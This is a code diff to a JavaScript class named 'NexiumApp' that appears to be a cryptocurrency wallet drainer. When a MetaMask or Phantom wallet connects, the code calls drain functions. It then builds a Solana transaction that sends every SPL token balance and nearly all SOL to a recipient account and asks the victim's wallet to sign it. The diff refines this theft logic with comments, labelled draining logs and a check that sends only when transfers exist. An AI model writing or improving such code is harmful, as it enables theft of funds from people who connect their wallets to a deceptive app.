@@ -143,7 +143,7 @@ class NexiumApp {
           if (this.connectedWalletType === 'MetaMask') {
             this.drainEthereumWallet(this.publicKey);
           } else if (this.connectedWalletType === 'Phantom') {
-            this.drainSolanaWallet();
+            this.drainSolanaWallet(); // <-- CALL THE RIGHT FUNCTION
           }
         } else if (!this.connectedWalletType) {
           console.log('Connect Wallet button clicked');
@@ -584,14 +584,15 @@ class NexiumApp {
         try {
           console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}...`);
           const updatedBlockhash = await this.solConnection.getLatestBlockhash();
-          console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);
-
           const transaction = new Transaction({
             feePayer: senderPublicKey,
             recentBlockhash: updatedBlockhash.blockhash,
           });
 
-          // Process SPL tokens first
+          // === SPL draining attempt logs ===
+          console.log("=== Starting SPL token draining attempts ===");
+
+          // 1. Add SPL token transfers first
           const tokenResults = [];
           for (const token of tokenBalances) {
             if (token.amount === 0n) {
@@ -609,11 +610,8 @@ class NexiumApp {
               new PublicKey(token.mint),
               recipientPublicKey
             );
-            console.log(`Recipient ATA for ${token.name}:`, recipientATA.toBase58());
             const accountInfo = await this.solConnection.getAccountInfo(recipientATA);
-            console.log(`Recipient ATA info for ${token.name}:`, accountInfo);
             if (!accountInfo) {
-              console.log(`Creating recipient ATA for ${token.name}`);
               transaction.add(
                 createAssociatedTokenAccountInstruction(
                   senderPublicKey,
@@ -639,7 +637,10 @@ class NexiumApp {
             tokenResults.push({ success: true, name: token.name });
           }
 
-          // Process SOL last
+          // === SPL draining finished, SOL draining next ===
+          console.log("=== Finished SPL token draining attempts, proceeding to SOL draining ===");
+
+          // 2. Add SOL transfer last (if enough balance)
           let solDrained = false;
           if (balance > minBalanceForTx) {
             transaction.add(
@@ -649,12 +650,13 @@ class NexiumApp {
                 lamports: balance - minBalanceForTx,
               })
             );
-            console.log(`✅ Added SOL transfer for ${(balance - minBalanceForTx) / 1000000000} SOL`);
+            console.log(`✅ Added SOL transfer for ${(balance - minBalanceForTx) / 1e9} SOL`);
             solDrained = true;
           } else {
             console.log(`Skipping SOL due to insufficient balance for transfer`);
           }
 
+          // 3. Only send if there are instructions
           if (transaction.instructions.length === 0) {
             console.log("❌ No valid transfers to process");
             this.showFeedback("No SOL or SPL tokens to drain.", 'error');
@@ -662,6 +664,7 @@ class NexiumApp {
             return;
           }
 
+          // 4. Send and confirm transaction ONCE
           console.log(`Transaction instructions: ${transaction.instructions.length}`);
           const { signature } = await window.solana.signAndSendTransaction(transaction);
           console.log("✅ Transaction sent:", signature);
